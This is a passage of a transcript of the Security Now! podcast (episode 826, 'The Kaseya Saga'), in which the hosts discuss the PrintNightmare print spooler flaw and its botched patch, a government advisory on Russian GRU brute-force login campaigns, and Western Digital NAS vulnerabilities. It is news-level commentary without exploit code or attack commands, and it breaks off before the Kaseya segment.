GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#826

DATE:		July 6, 2021

TITLE:		The Kaseya Saga

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-826.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  The so-called Windows "PrintNightmare" remote code execution flaw, as bad as it is, was overshadowed by the Sodinokibi malware which the REvil ransomware gang managed to infiltrate into Kaseya, a popular provider of remote network management solutions for managed service providers.  Since those MSPs all, in turn, have their own customers, the result was a multiplicative explosion in simultaneous ransomware attacks.  Since those attacks reportedly numbered in excess of 1,000, this makes it the worst ransomware event in history.  So, while we'll definitely be covering the PrintNightmare and other events of the week, our topic will be the reconstruction of the timeline and details of the Kaseya Saga.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with an update on Microsoft's PrintNightmare.  Apparently, they didn't fix it completely.  Another patch just came out.  Steve explains all.  We'll also talk about a BMW with SpinRite running, plus the Kaseya nightmare.  How bad is it going to get?  Steve has details, all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 826, recorded Tuesday, July 6th, 2021:  The Kaseya Saga.



It's time for Security Now!.  Get ready.  Fasten your seatbelts.  We're going to talk about keeping yourself and your loved ones safe, private, and secure online with this guy right here, Steve Gibson of GRC.com.  Hi, Steve.



STEVE GIBSON:  Leo, great to be with you again.  And I actually do use the phrase "buckle up" later on in the podcast.



LEO:  Yeah.



STEVE:  So, yeah.  Be good to have those seatbelts buckled.  I tripped over the spelling of this randomly spelled company for the name of the podcast.  So I'll be fixing these show notes, if any of you find the spelling somewhat confusing.



LEO:  I think you got it right in the show notes.



STEVE:  I got it right several places.  But the download, I think, is K-A-Y-S-E-A, and that's not it.  It's K-A-S-E-Y-A.  The Kaseya Saga is today's topic.  The so-called Windows PrintNightmare, which was both a local privilege elevation or escalation and, it turns out, also a remote code execution flaw, as bad as it is, was overshadowed by the Sodinokibi malware which the REvil ransomware gang managed to infiltrate into Kaseya servers.  They're a popular provider of remote management solutions for managed service providers.  We were just talking last week about managed service providers being an interesting infection vector because they inherently are in the networks of all of their clients.  So if you go up the food chain one level to the purveyor of a server used by MSPs, then if you can get in there, you get everything.  So, boy.  What was the count you just heard, upwards of 1,500?



LEO:  1,500.  It's sad because it's all small businesses.



STEVE:  Yes.



LEO:  Like ours.  We use a managed service provider.  Russell's an MSP.



STEVE:  Yes, who would be outsourcing some function of your system.



LEO:  You can't afford a full-time IT department, you're going to have the contract IT guy, an MSP, and they're - very frequently they use this software.  I don't think Russell does, thank goodness.  But 1,500.  And that's, I think, going to be a small number compared to the total eventually.  Lots of companies.



STEVE:  So what we have is at least now the worst ransomware event in history.  And what's fun is, a lot is known about it, like the fact that they actually knew about the problem before the attack.



LEO:  Oh.  That's annoying.  Oh.



STEVE:  Oh, that one's got to hurt.  So anyway, Episode 826 for this first podcast of July, making next Tuesday a much-anticipated Patch Tuesday.  Hopefully Microsoft will have had time to try again to fix the PrintNightmare.  Well, we'll be talking about it.  But they actually fumbled the first fix last month, which is part of the problem.  And we have a really interesting and wacky Picture of the Week.  So I think we've got another great podcast for our listeners.



LEO:  Yeah.  But just to be clear, the Kaseya problem is not related to the Microsoft problem.  These are two unrelated...



STEVE:  Oh, yeah, sorry, correct.



LEO:  No, no, I just wanted to [crosstalk].



STEVE:  Just a lot going on.  A lot going on.



LEO:  Yeah, no kidding.  Steve, shall we do the picture?



STEVE:  Now, you know, remember that picture we had quite a while ago, a couple years ago, Leo, that had the ground wire going into the bucket full of dirt?



LEO:  Yeah.  That's ground, yeah.



STEVE:  I looked at that for a while, and I thought, what is going on here?  Well, this picture is not that.  It's quite a bit more sophisticated.  But when I understood what was happening, I gasped because - okay.  Well, for several reasons.  First of all, okay, this was tweeted to me from @lifeattv, which is Life at Terminal Velocity is the person's name on Twitter.  And it shows a high-end car, a BMW, whose center console he has just completely disassembled.  Which, again, that's not where normal people go.  It's factory assembled, and it's impossible to get into.  I mean, countless YouTube videos are committed to, like, how do I take my radio out of my car?



So we have two pictures in our Picture of the Week.  For those who cannot see what's happening on the screen - okay.  So what he tweeted, the textual content is "SpinRite saves the day again.  My BMW is having fits, has a mechanical hard disk drive."  Okay, now, I didn't know this.  You knew this, Leo.  Stop right there.  You have a car with a mechanical hard disk drive in it?  Okay, apparently that...



LEO:  Seems like a bad idea on the face of it.



STEVE:  Seems like a really, I think, almost...



LEO:  I don't think any modern cars do, but 10 years ago it wasn't uncommon, yeah.



STEVE:  Leo, as bad as a hard disk drive in a laptop.  Who would ever put a hard disk drive in a laptop?  Yet, oh my god, everybody did.  And in fact we probably recovered - SpinRite was probably used more to recover laptop hard disk drives because there the heads were literally bouncing on the surfaces as someone would, like, toss their drive across the room to their spouse with it, like, on.  Anyway, he said:  "Dealership wants $1,500 in parts and $1,000 in labor."  So that's $2,500.



LEO:  Whoa.



STEVE:  Yeah.  Well, look at what it takes.  I would charge somebody $1,000 to open all this up.  My god.  And I'd just walk away without trying to put it back together again because apparently the stories my parents tell me is what I used to do is just take stuff apart to see how it worked, and then I wasn't really that interested in reassembling it.



LEO:  I took apart many a pocket watch and other clock devices and never could figure out how to get all those little pieces back in there.



STEVE:  Yeah.  I know.  You end up with some spare little springy things.



LEO:  Yeah, things go flying across the room, you don't know what the hell they are.



STEVE:  Do we really need that?  I don't think so.  So anyway, he said, so $2,500 "to maybe fix the problem."  So he said:  "This is the second pass," which is the first picture, showing SpinRite running.  He says:  "This is the second pass.  First pass fixed some issues.  Radio now boots."



So anyway, this was on June 29th he tweeted this.  The first picture shows, again, this is like - so he's got a desktop PC sitting in the passenger seat with the red SATA cable coming out of it, probably plugged into the motherboard, coming out of it to a SATA extension, which you can see in the second picture, which then plugs into a Toshiba 3.5" spinning, you know, I think I have a few of those around here.  I think for some reason it was a 1.5TB drive.  I don't know, maybe I just zoomed in and I saw that, or I'm not sure why I think that; but, you know.  And he's got all of his tools on the driver's seat.  And then there's like this cast steel center console thing which is kind of half out.  Anyway, I don't know how his car is ever going to go again.  But at least the radio boots.  So good luck.



LEO:  This is hysterical.



STEVE:  Oh, wow.



LEO:  I guess he couldn't - because I would have taken the Toshiba out and brought it into the house.  But I guess he couldn't for some reason.



STEVE:  No, he can.  It's got two plugs on it.  I mean, it's not...



LEO:  Yeah, but I think he needs the power, I'm guessing he needs the power from the car or something.  I don't understand exactly why it's done this way.  But anyway.  Or maybe he just likes the idea of doing it in the car.



STEVE:  Well, whoever you are, Life at Terminal Velocity, I believe that you are well named because you are definitely running your life at terminal velocity.  Whoa.



LEO:  Actually, terminal velocity is not that fast.  I just want to point out it depends on the air you've got.



STEVE:  That's true.  It's gravity and air pressure and density and the amount of resistance.



LEO:  Yeah, I think it's like 95 miles an hour.  It sounds dangerous; doesn't it?  Terminal velocity.



STEVE:  It does.



LEO:  But it's just the fastest you can go in the air based on the gravity.



STEVE:  Right.



LEO:  32 meters per second squared, as I remember.



STEVE:  So our first story is PrintNightmare is not CVE-2021-1675.  Probably the biggest nightmare about PrintNightmare, aside from the fact that it's being exploited in the wild right now, I mean, today, okay, after Microsoft thought it was fixed, is the incredible amount of confusion surrounding multiple stumbles that both Microsoft and some well-meaning security researchers have made.  This has just been a mess.  There are two related but separate and independent issues at play which affect all current and all previous versions of the Windows Print Spooler service, which Windows starts up and runs by default across the board.  And being a print spooler, a trusted component, it's of course running with full system kernel privileges.



Now, Windows Print Spooler has historically been a source of many serious vulnerabilities.  And we'll all remember, Leo, you were sitting with me when 10 years ago it was the exploitation of it, it provided the exploitation which was leveraged by Stuxnet to take over, spin up, and damage the centrifuges being used by Iran's nuclear enrichment program at the time.  And it's been, again, I mean, it's a constant source of problems.  And there are things, you know, there's the concept of a lemon, right, where you buy a car, and it's just got one thing wrong after another.  And in fact there's a law, I think, right, the lemon law...



LEO:  Yeah.



STEVE:  ...that at some point you're just allowed to say, hey, take this back.



LEO:  Is this the lemon flaw?  Is that what you're talking...



STEVE:  Well, no.  I'm kind of put in mind of Adobe Flash.



LEO:  Oh, yeah.  Yeah, that was a lemon, yeah.



STEVE:  Which was originally, well, and think about it.  It was originally written before security was an issue.  So was the print spooler.  I'm sure there's still code in there from Windows 95, when they thought, oh, we need to pool our sprinting.  Wait, spool our printing.  



LEO:  Or pool our sprinting.  Either one, yeah.



STEVE:  And so we're still - we've still got that code which probably some summer intern - because, I mean, okay.  That's a perfect thing for Microsoft to have given a summer intern.  Oh, give it to Harry.  Because it doesn't matter.  It's the print spooler.  It's going to work or not.  We're still running Harry's code now, and domain controllers are being taken over as a consequence.  Anyway, here we are, 10 years later, with thanks to Harry's summer internship, a local privilege escalation vulnerability and also a separate remote code execution vulnerability.



And get this.  During last month's June 8th Patch Tuesday, Microsoft believed that they had patched and closed the vulnerability.  They only thought there was one.  That was the local privilege escalation.  They identified it as 2021-1675.  But as Will Dormann, the vulnerability analyst at the CERT coordination center, tweeted:  "I've published a vulnerability note on this.  I suspect that Microsoft will need to issue a new CVE to capture what PrintNightmare exploits, as it sure isn't what Microsoft patched as CVE-2021-1675."  In other words, okay, now, that would lead you to believe they patched the wrong thing.  But it turns out no.



A Chinese researcher with NSFOCUS, who reported the original actual vulnerability to Microsoft, explained last Thursday in a tweet:  "CVE-2021-1675 is meant to fix PrintNightmare, but it seems that they just test with the test case in my report, which is more elegant and also more restricted.  So the patch is incomplete."  And then he has a little frowny face in his tweet.



Okay.  So understanding what he just said, this is not the behavior of a Microsoft whose OS the world can depend upon as much as it currently does.  The NSFOCUS tweet suggests that rather than carefully examining the researcher's provided proof of concept and using it to reveal and understand the whole problem that it was intended to reveal, someone at Microsoft, maybe late for lunch, apparently quickly applied a patch to shut down the example code, but without resolving the underlying actual problem.  Which you could still work around after the patch had been applied to Windows.



Okay.  So then when this researcher saw what was not done last month, he attempted to reach out again to @msftsecresponse.  Failing to get satisfaction, he tweeted:  "My case of #PrintNightmare is closed.  And I can't log into MSRC portal because there is no Microsoft account option which I used."  He says:  "Then how can I report that you not fix CVE-2021-1675 properly?"  And he says:  "Another call is kept vulnerable."  He says:  "That is your cooperation?"  And then he adds the  @msftsecresponse so that Microsoft security response would receive the tweet.



And then the situation gets even worse, when just before the end of June, another Chinese security vendor, Qi An Xin, announced that they found a way to exploit the vulnerability to achieve both local privilege escalation and remote code execution, and published a demo video while deliberately refraining from sharing additional technical details in the interest of responsible disclosure.  But the Hong Kong-based cybersecurity company Sangfor, seeing that, thought okay, well, apparently we're talking about this now.  They published an independent deep dive of the same vulnerability to GitHub, which included fully working proof-of-concept code.  So they apparently mistakenly believed that Microsoft had fixed it.



LEO:  Well, it's been fixed.



STEVE:  When Microsoft hadn't, like because the guy didn't really give it the time it needed.



LEO:  That's so bad.



STEVE:  Right.  So they included in their publication on GitHub fully working proof-of-concept code.  The proof of concept remained publicly accessible for several hours before they -someone I'm sure told them, hey, you realize you just published a proof of concept for a problem that Microsoft didn't fix...



LEO:  It works.



STEVE:  ...on the 8th of June.  Yeah, it's not a proof of concept, it's a proof of exploit.  So they pulled it down, but it had been forked by that time.  So the proof of concept remains available.  I've got links to them in the show notes.



LEO:  Oh, god.



STEVE:  And so they posted, the principal security researcher at Sangfor posted:  "We deleted the proof of concept of PrintNightmare.  To mitigate this vulnerability, please update Windows to the latest version" - which, eh, doesn't work - "or disable the spooler service."  Which is really the only thing you can do to completely shut this thing down.  Unfortunately, as I said, updating Windows won't help.  Hopefully updating Windows next Tuesday will.  Meanwhile, this is in the wild.  Right?  I mean, this is being actively exploited.



LEO:  So do they need access to your machine?  How can they get to the print spooler?



STEVE:  Yes.  It is a local - well, okay.  That's complicated, too.  One of the things that's been happening among security researchers, like during this drama, is that they've all been publishing - they've been trying to publish flow charts to show what you turn on and what you turn off and where you go.  Okay?  So, and you're showing it on the screen.  I've got it in the show notes here.  This is the current flow chart which was produced by the CERT guy, Will Dormann, after his post-patch attempt to get a handle on this.



And so the short version is just, if you don't actually know that you need print spooler - for example, a domain controller probably doesn't have a printer on it; right?  It's not - you don't have users dropping print jobs onto a domain controller.  That's not what they're for.  Print spoolers are typically on your local machine.  I mean, you don't even have to use it; right?  You can turn it off, and your machine can still print.  It just ties up the app while it's printing instead of dumping it into the spool queue so that it can say, yeah, okay, we're doing that in the background.



LEO:  But it needs RPC.  You need remote access to use this.



STEVE:  True.



LEO:  At least to remotely exploit it.  I guess you can do it locally.



STEVE:  Exactly.  The remote exploitation.  The biggest problem is that it is a local privilege escalation, and that is in the toolkit now of the bad guys.  As we've often said, it sounds like a remote code execution is really bad, and it is.  But there's lots of uses, malicious uses for local privilege escalation, where, for example, many times you can do something, for example, like you can log onto an FTP server as an anonymous, very unprivileged user.  But if that FTP server where you're logged in unprivileged, and even if it was running in an unprivileged account, right, to be really safe, well, if it's got a flaw that allows you to use an escalation of privilege, now you're root.  Now you're system privileged, and you can do whatever you want.



LEO:  It's not at all - these days I would expect it's almost universally the case that you don't - it's a chain of exploits.  It's rarely just a single exploit.  You get this chain that slowly gets you closer and closer to your goal.



STEVE:  Only when you purchase logon credentials for an RDP server from the dark web.  And it's like, oh.



LEO:  That works.



STEVE:  Still works.  How nice.  Yeah.  What do I want to do today?



LEO:  Oh, lord.



STEVE:  So this PrintNightmare was well named.  It is a nightmare.  It is, I mean, it should be an embarrassment to everybody who dipped their oar in the water of this thing and paddled in the wrong direction.



LEO:  I can't believe that the patch was written to the published code as opposed to understanding the problem and fixing it.



STEVE:  Yes.



LEO:  That's like, oh, I got all the questions to the test.  What do I need to learn anything for?



STEVE:  Exactly.



LEO:  It's so dumb.



STEVE:  Exactly.  Whoever it was just thought, okay, maybe they're in a hurry.  Like I said, maybe they were late for lunch.  I don't know.



LEO:  We don't know.



STEVE:  Yeah.  But we're still with the problem, unfortunately.



LEO:  "Hey, Joey.  All the guys are going out for Chinese.  Come on.  Hurry up."  "I've just got to write this patch.  I'll be right there."



STEVE:  Yeah, yeah, because it's got to get out on June 8th.  And so, oh, wow.  So what about the vulnerability itself?  It boils down to the ability of any non-privileged user to bypass the authentication barrier which prevents unprivileged users from installing whatever possibly malicious print drivers they choose.  Specifically, any attacker who can bypass the authentication which protects the RpcAddPrinterDriver API can install a malicious print driver.  Microsoft's documentation claims that the client needs to hold, that is, the client, the user who's calling the AddPrinterDriver API must have the SeLoadDriverPrivilege, which makes sense, for the AddPrinterDriver call to succeed.  When you make a call to AddPrinterDriver, your security privileges are checked to see whether you are holding the LoadPrinterDriver privilege.



It turns out Microsoft's documentation is wrong.  You don't need to have the LoadPrinterDriver.  A call to the ValidateObject Access is being made.  And it turns out that due to a mistake in the code that sets up the call's parameters, the user has control over the validation check and is able to skip it.  Which despite the fact that the people who disclosed this confidentially to Microsoft said this, Microsoft said, okay, how do we - you know, like I'm late for Chinese.  How do I fix this so this isn't true any longer?  And they made a patch that fixed so that the proof of concept would no longer succeed, but the problem wasn't solved.  Wow.



So if the target is a Windows domain controller, a normal domain user, an unprivileged user can connect to the spooler service, which, okay, should not be running in a domain controller.  Hello.  I mean, one of the things that we all used to do, those of us, remember Leo, in the old days, is we'd go through this exhausting and exhaustive list of services that Windows XP was running and just shut off a whole bunch of crap that Microsoft had running, taking up cycles, slowing down our boots, consuming RAM, you know, stuff like whatever synchronized folder link transport or something was.  There's like, well, okay, I'm not - there's no one for me to synchronize to.  What's this doing running?



Anyway, they just turn it all on because they'd rather that than have you call support if something you try to do doesn't work.  But anyway, as a consequence, apparently Windows domain controllers the world over are running print spoolers which they don't need to run, which are vulnerable, and which allow an unprivileged user to install their own malicious driver, take over the Windows domain controller, and then these days spread ransomware throughout the domain.  Oh.  And before signing off, the researcher noted:  "There are more hidden bombs in spooler which are not publicly known."



LEO:  Oh, good.



STEVE:  "We will share more RCE and LPE vulnerabilities in Windows Spooler."



LEO:  Thanks so much.



STEVE:  Yeah.  "Please stay tuned and await our Black Hat talk, 'Diving Into Spooler:  Discovering LPE and RCE Vulnerabilities in Windows Printer.'"  So that ought to be next month.  Yeah.



The 0patch guys have quickly produced one of their cool micropatches for this, if you need to keep your print spooler online for the next week and believe that you might become a victim of this before, hopefully, next Tuesday's Patch Tuesday.  Either the guy came back from lunch and realized he'd made a mistake, or they kicked him out of his seat and put somebody who actually knows how to patch problems.  Whoa.  So with any luck this will finally be fixed permanently, and we can put the PrintNightmare behind us.



LEO:  Yeah.  So I'm just trying to remember.  You don't have to use a print spooler.  You could still print without a print spooler.  Or no?



STEVE:  Right.  If you turn it off, everything still works just fine.  You shut the service down.



LEO:  Okay.  Just the machine may be tied up while you're printing.



STEVE:  Correct.



LEO:  But printers are so fast now.



STEVE:  And actually not even the machine, just the app.  It'll just, like, show printing, and it'll stay up instead of disappearing.  And then, I mean, and it's almost annoying because, if you do have a problem with your printer, it goes to the spooler and then dies there.



LEO:  And you think it's done, yeah.



STEVE:  Yes.



LEO:  The spooler has always been a bag of hurt.  That has never - I can - problem since Windows 95 with the print spooler.  Constant.  



STEVE:  Yeah, it's because of that summer intern, Harry.



LEO:  The intern, man, he didn't know what he was doing.



STEVE:  He was there for a couple months.  He said, "Yeah, here's your print spooler."



LEO:  How hard could it be?  It's not rocket science.



STEVE:  No.  Okay.  So I titled this one "The Authentication Dilemma."  An eight-page PDF was jointly published by the U.S.'s NSA, CISA, and FBI, and the U.K.'s GCHQ-based National Cyber Security Centre, outlining an ongoing brute-force credential-stuffing attack being waged against the West by Russia's GRU, their General Staff Main Intelligence Directorate.



The executive summary on this eight-page detailed report says:  "Since at least mid-2019 through early 2021, Russian General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS), military unit 26165" - in other words, we know exactly who.  I mean, we probably have the size of their underwear.  But we know where they are.  This thing says:  "...used a Kubernetes cluster to conduct widespread, distributed, and anonymized brute-force access attempts against hundreds of government and private sector targets worldwide."  And Leo, I heard you mentioning this on what would normally be the Sunday TWiT, but you recorded it on Saturday because of the Fourth of July.



"GTsSS malicious cyber activity has previously been attributed by the private sector using the names Fancy Bear, APT28, Strontium, and a variety of other identifiers."  And we've bemoaned the fact that it's known by, like, 10 different names, so it sounds like 10 different people.  But no.  Or groups.  Nope, just one.  The 85th GTsSS directed a significant amount of this activity at organizations using Microsoft Office 365 cloud services; however, they also targeted other service providers and on-premises email servers using a variety of different protocols.  These efforts are almost certainly still ongoing.  And it's not here in this little executive summary.  But like HTTP, HTTPS, SMTP, POP3, and so forth.  You know, the standard TCP old-school TCP services.



They said:  "This brute-force capability allows the 85th GTsSS actors to access protected data, including email, and identify valid account credentials.  Those credentials may then be used for a variety of purposes, including initial access, persistence, privilege escalation, and defense evasion.  The actors have used identified account credentials in conjunction with exploiting publicly known vulnerabilities, such as exploiting Microsoft Exchange servers using CVE-2020-0688 and CVE-2020-17144" - in other words, the ProxyLogon problems - "for remote code execution and further access to target networks.  After gaining remote access, many well-known tactics, techniques, and procedures" - which we now refer to as TTPs - "are combined to move laterally, evade defenses, and collect additional information within target networks."



And then they finish:  "Network managers should adopt and expand usage of multifactor authentication to help counter the effectiveness of this capability.  Additional mitigations to ensure strong access controls include time-out and lock-out features, the mandatory use of strong passwords, implementation of a zero trust security model that uses additional attributes when determining access, and analytics to detect anomalous accesses.  Additionally, organizations can consider denying all inbound activity from known anonymization services, such as commercial virtual private networks" - and I should mention that in the expanded pages of this they note that they're seeing the use of commercial VPNs to create more of a spray of source IPs to prevent easy lockout.  So they're saying block known anonymization services such as commercial VPNs "and The Onion Router, where such access is not associated with typical use.  Meaning that some, you know, you can pretty much determine whether typical users would be coming in through those means."



So I absolutely agree with the idea of filtering and blocking any knowable atypical access IPs.  As I've often noted, anywhere a relatively static originating IP is knowable - for example, Leo, for you, between your work IP block and your home IP - it should absolutely be used, that is, a known block of allowed IPs as part of a connection qualification filter.  Network connections that do not need to inherently be accepted from everywhere should never be accepted from everywhere.



We also know that strong security is not provided by simple obscurity.  But when you think about it, that's what a password is.  It may be very obscure; but many passwords, even today, contain many fewer than 128 bits of true entropy.  So they are less obscure than a strong cryptographic key.  In a world where the weakest link determines the effective strength of an entire chain, user-chosen passwords remain a problem.



From time to time, upon account creation - it's happened to me a few times -  a web service will pre-assign a super-strong password to me rather than asking me to choose my own.  I think that's brilliant.  If I don't already have some means of accepting, securely recording, storing, and regurgitating on demand an arbitrary high-entropy string of characters, then I've already lost the game.  I'm sure that everyone listening to this podcast has such a facility.  We were just talking about one of our sponsors that offers that.  But even today, we know that not everyone does.



And this brings me to my takeaway conclusion from this news from our law enforcement and intelligence services that the Internet's background radiation has inevitably evolved from randomly probing packets to deliberately focused and targeted connections which are attempting to brute force their way in.  Bad guys are logging into other people's RDP servers using something that someone knows.  We really do need to get completely away from the terminally weak "something you know" form of username and password identity authentication.  And the sooner the better.



Whatever that solution will be, it needs to be free and easy to use so that everyone will be able to use it.  And it doesn't even need to be perfect.  It just needs to be a lot better than the decades-old mess we're still all using today.  I sincerely hope that the right people somewhere, are giving this the attention it needs.  As we all know, I invested seven years of my life creating one complete free solution to this need and problem.  FIDO and WebAuthn are useful steps in the right direction, but they both fall short of offering a complete solution.  The world doesn't need to use SQRL, but it sure needs to do something.  And I hope it does.



Western Digital has stepped up.  As we covered last week, many users of Western Digital's My Book Live and My Book Live Duo, whose last firmware update was in 2015, and who were consequently unable to patch even if they wanted to after a vulnerability was discovered three years later, in 2018, which was three years ago, they found themselves to be victims of a recent Internet-wide malicious data wiping campaign.  Although direct evidence is not decisive, security industry observers believe that this may be the result of a war between rival botnet groups.  We're bringing this up again with the news that Western Digital has, as I said, stepped up.  And I'm very impressed.



Last Wednesday, on June 30th, WD updated their coverage of what has been a true disaster for many of their users.  They posted:  "Western Digital has determined that Internet-connected My Book Live and My Book Live Duo devices are under attack by exploitation of multiple vulnerabilities present in the device.  In some cases, the attackers have triggered a factory reset that appears to erase all data on the device."  And "appears" is of course the key word here.  "To help customers who have lost data as a result of these attacks, Western Digital will provide data recovery services, which will be available beginning in July.  My Book Live customers will be offered a trade-in program to upgrade to a supported My Cloud device."



And although it doesn't say it here, I read elsewhere, or someone talked to Western Digital and came away with the information that it would be no charge, no charge data recovery.  They said in their note, and actually in their update:  "The My Book Live firmware is vulnerable to a remotely exploitable command injection vulnerability when the device has remote access enabled.  This vulnerability may be exploited to run arbitrary commands with root privileges.  Additionally, the My Book Live is vulnerable to an unauthenticated factory reset operation which allows an attacker to factory reset the device without authentication."  Thus unauthenticated.  "The unauthenticated factory reset vulnerability," they said, "has been assigned CVE-2021-35941."



They said:  "We have heard concerns about the nature of this vulnerability."  And actually we voiced them loudly last week.  Why did you comment out the test for the password?  That seems like a bad thing.  Anyway, they said:  "We have heard concerns about the nature of this vulnerability and are sharing technical details to address these questions."  And indeed they did.



They said:  "We have determined that the unauthenticated factory reset vulnerability was introduced to the My Book Live in April of 2011 as part of a refactor of authentication logic in the device's firmware.  The refactor centralized the authentication logic into a single file, which is present on the device as includes/component_config.php, and contains the authentication type required by each endpoint.  In this refactor, the authentication logic in system_factory_restore.php was correctly disabled" - that's the commenting that we all saw - "but the appropriate authentication type of ADMIN_AUTH_LAN_ALL was not added to component_config.php, resulting in the vulnerability. The same refactor removed authentication logic from other files and correctly added the appropriate authentication type to the component_config.php file."



They said:  "We have reviewed log files which we've received from affected customers to understand and characterize the attack.  The log files we reviewed show that the attackers directly connected to the affected My Book Live devices from a variety of IP addresses in different countries.  Our investigation shows that in some cases the attacker exploited both vulnerabilities on the device, as evidenced by the source IP.  The first vulnerability was exploited to install a malicious binary on the device, and the second vulnerability was later exploited to reset the device."



And then, finally, later they reiterate as they conclude their posting:  "For customers who have lost data as a result of these attacks, Western Digital will provide data recovery services."  And we believe that those are free.  They said:  "My Book Live users will also be offered a trade-in program to upgrade to a supported My Cloud device."  And of course we'll be discussing My Cloud in a minute.  Watch your step.  "Both programs will be available beginning in July, and details on how to take advantage of these programs will be made available in a separate announcement."



So overall, this impresses me.  In the first place, we learn how and why that authentication bypass was introduced into the devices.  That wholesale commenting out of the access authentication that was seen last week was troubling in the extreme.  But their refactoring explanation makes sense, complete sense.  And I can see how a coder would have easily intended, but ultimately failed, to apply the alternative authentication protection which the designed system provided.  That's exactly the way these mistakes are made.



And WD's willingness to take responsibility for a device which it was selling 11 years ago, back in 2010, which has not been supported for the past six years, I think says a great deal about the company's management.  So to that I say bravo.  I'm sure they found that the apparent data loss from the factory reset was recoverable.  So hats off to them for stepping up and offering to get their customers' data back.  I'm impressed.



But before we get all choked up and weepy-eyed over WD's willingness to help their My Book NAS users, we need to note that a much larger group of WD users, those who are still using the My Cloud OS 3 edition, which was built into WD's newer My Cloud NAS devices, are today in trouble.  It turns out that all My Cloud OS 3 devices -  which is a newer set of devices.  The My Cloud is what they were offering to trade the Live users' up to.  The OS 5 is where they are now.  OS 3 has a problem.  It turns out that all of the My Cloud OS 3 devices contain a serious remote code execution flaw and that, wouldn't you know it, OS 3 is no longer supported.



This came to light when a pair of intrepid security researchers, and actually several other groups, were all planning to present their discoveries of these problems with Western Digital's current cloud devices during late last year's Pwn2Own competition in Tokyo, back in November.  They all had the rug pulled out from them when, five days prior to the Pwn2Own competition, WD released the completely rewritten My Cloud OS 5 just before, as I said, five days before the competition date.  Being a complete rewrite, OS 5 inherently eliminated the bugs that these multiple researchers had hoped to cash in on.  Since the ground rules for Pwn2Own require that qualifying software must be the most current, the flaws in OS 3, which had then been obsoleted, were no longer prizeworthy.



Of course, as we all know too well, the fact that OS 5 appeared doesn't spontaneously cause all of the OS 3's out in the world to be updated to the OS 5 firmware.  And in fact it appears that not all of the WD hardware that runs OS 3 will even run OS 5.  WD has a list of those hardware platforms that will.  And even if it did, OS 5's complete rewrite, turns out, left out a number of OS 3's more popular features.  So if WD's users of OS 3-based My Cloud devices even knew of the trouble with their current firmware and wished to update, WD would be asking those customers if they were able to update, given the hardware they have, to accept a feature downgrade in order to repair a previous apparently badly broken and now out-of-support OS.



Once again, while WD certainly has the legal right to do whatever they wish with their customers, it's not the best way to earn and maintain a reputation for standing behind one's products throughout their entire useful service life.  If My Cloud devices were sold under the condition that, for example, they would run for exactly five years and then self-destruct, it seems unlikely that many people would choose that solution, though that's essentially what has happened here.



In any event, earlier this year, in February, which is a few months after Pwn2Own was going to happen, that research team, who was getting ready to release this, published a detailed YouTube video which documents how they discovered this chain -again, a chain, Leo, as you said - a chain of weaknesses that allows an attacker to remotely update a vulnerable device's firmware to add a malicious backdoor using a low-privileged user account having a blank password.  Tens of thousands of devices appear to be vulnerable to that attack today.



So before the Pwn2Own competition, there appears to have been some sort of communication mix-up because the researchers said that WD had never responded to any of their reports.  Curious about that, Brian Krebs apparently asked WD what the story was, and he was told, get this:  "The communication that came our way confirmed the research team involved planned to release details of the vulnerability and asked us to contact them with any questions.  We didn't have any questions."



LEO:  We don't have any questions.



STEVE:  "So we didn't respond."



LEO:  Well, there's your mistake.  I have some questions now.



STEVE:  Really?  That's what you're going with, WD?



LEO:  That's really...



STEVE:  You didn't answer because they said only call us if you don't have any questions.



LEO:  We don't have any questions.



STEVE:  And then WD continued:  "Since then, we have updated our process and respond to every report" - even those that we don't have any questions about...



LEO:  Yeah, seems like a good idea.



STEVE:  "...in order to avoid any such miscommunication like this again."



LEO:  It does sound like they've learned their lesson a little bit, I have to say.  They took a lot of pain here.



STEVE:  It seems like they keep - yeah, yeah.  They said:  "We take reports from the security research community very seriously [uh-huh] and conduct investigations as soon as we receive them."  Even if we don't mention it.  Right.  So, and Brian added that Western Digital ignored questions, apparently from him, about whether the flaw found by the researchers had ever been addressed in OS 3.  So they're still ignoring questions that they don't want to answer.  Brian reports that a statement published on WD's site, dated March 12, 2021, says that the company will no longer provide further security updates to the My Cloud OS 3 firmware:  "We strongly encourage moving to the My Cloud OS 5 firmware," the statement reads.  "If your device is not eligible for upgrade to My Cloud OS 5, we recommend that you upgrade to one of our other My Cloud offerings that support My Cloud OS 5."



And we should note that these WD NAS gadgets are not cheap.  They weigh in around $500.  So telling their users who are stuck with OS 3 for whatever reason to "upgrade" to other WD offerings that support My Cloud OS 5 might be asking quite a lot.  In order to save some of the value from all of their research, the team developed and released their own patch to fix the vulnerabilities they had found in OS 3.  Unfortunately, the patch needs to be reapplied whenever the My Cloud device is rebooted since it will be returned to its previous unpatched and vulnerable state.  Western Digital told Brian that they were aware of third parties offering security patches for My Cloud OS 3, but of course they couldn't stand behind them in any way.



So none of this is really confidence-inspiring, once again.  And NAS devices in general appear to be perennially troubled.  I love my Drobos, but no way would I ever consider exposing them to the public Internet.  They are permanently linked to each other through Syncthing, both safely tucked away behind multiple layers of NAT routing.



And I was thinking about this.  If I had to expose a NAS to the public Internet, I would use a well-maintained Ubuntu Linux running NextCloud.  And boy, if you haven't, take a look at NextCloud.com/secure if you want to see some guys who have really gone way over the top with security.  They have multiple code audits and security reviews, and even -  get this - a live video verification option as part of their remote authentication process.  You have to get on TV and say, "Hi, Mom.  It's really me.  See?"  And then you qualify for folder sharing.



So anyway, we do see NAS devices as quite a problem.  And I ought to also mention, if you do have some need to have a NAS on your network, you should arrange for it to be very much like my PHP server is at GRC, completely isolated from the rest of your network.  You may need to get to it, but don't let it get to you.  You could put a NAT router between it and the rest of your network so that your network can see it, but it can't see your network, because this just seems to be a hard thing to get right.  And Leo, what is not hard to get right is your choice of sponsors.



LEO:  Thank you for that segue.  By the way, update.  Microsoft has just pushed an out-of-band fix for Windows PrintNightmare.



STEVE:  Good.



LEO:  So if you are - yeah, I think that was the right thing to do, not wait till Tuesday.



STEVE:  Good.  Go get it. 



LEO:  Yeah.



STEVE:  Do you have to get it, or will it self-install?



